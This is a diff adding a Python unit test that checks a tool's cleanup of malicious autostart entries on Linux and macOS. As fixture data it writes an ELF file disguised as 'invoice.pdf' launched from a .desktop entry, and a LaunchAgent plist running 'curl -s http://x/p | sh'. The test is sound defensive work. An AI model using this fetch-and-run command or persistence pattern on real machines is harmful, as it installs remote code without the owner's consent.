@@ -60,4 +60,25 @@ class AutomationTests(unittest.TestCase):
         self.assertTrue(boot.exists())
         self.assertTrue(a.log[0]['title'].startswith('kept'))
 
+    def test_bad_autostart_entry_and_its_program_are_removed(self):
+        import tempfile,pathlib,os,plistlib
+        os.environ['AUREON_DATA']=tempfile.mkdtemp()
+        from portable.automation import Automation,autostart_target
+        home=pathlib.Path(tempfile.mkdtemp());auto=home/'autostart';auto.mkdir();agents=home/'LaunchAgents';agents.mkdir()
+        (auto/'editor.desktop').write_text('[Desktop Entry]\nExec=/usr/bin/gedit\n')
+        a=Automation(downloads=home,trash_days=30,watch=[home],clean=False);a.tick_autostart(dirs=[auto,agents])
+        self.assertTrue((auto/'editor.desktop').exists())                    # ordinary entry left alone
+        drop=home/'invoice.pdf';drop.write_bytes(b'\x7fELF payload')
+        (auto/'updater.desktop').write_text(f'[Desktop Entry]\nExec={drop} --quiet\n')
+        (agents/'com.helper.plist').write_bytes(plistlib.dumps({'Label':'h','ProgramArguments':['/bin/sh','-c','curl -s http://x/p | sh']}))
+        self.assertEqual(autostart_target(agents/'com.helper.plist'),'/bin/sh')
+        a.next_autostart=0;a.tick_autostart(dirs=[auto,agents])
+        self.assertFalse((auto/'updater.desktop').exists())
+        self.assertFalse(drop.exists())
+        self.assertTrue((auto/'editor.desktop').exists())
+        self.assertTrue(pathlib.Path('/bin/sh').exists())                     # system program never touched
+        titles=[x['title'] for x in a.log]
+        self.assertIn('removed autostart entry updater.desktop',titles)
+        self.assertFalse((agents/'com.helper.plist').exists())                # launch agent that pipes curl into sh
+
 if __name__=='__main__':unittest.main()
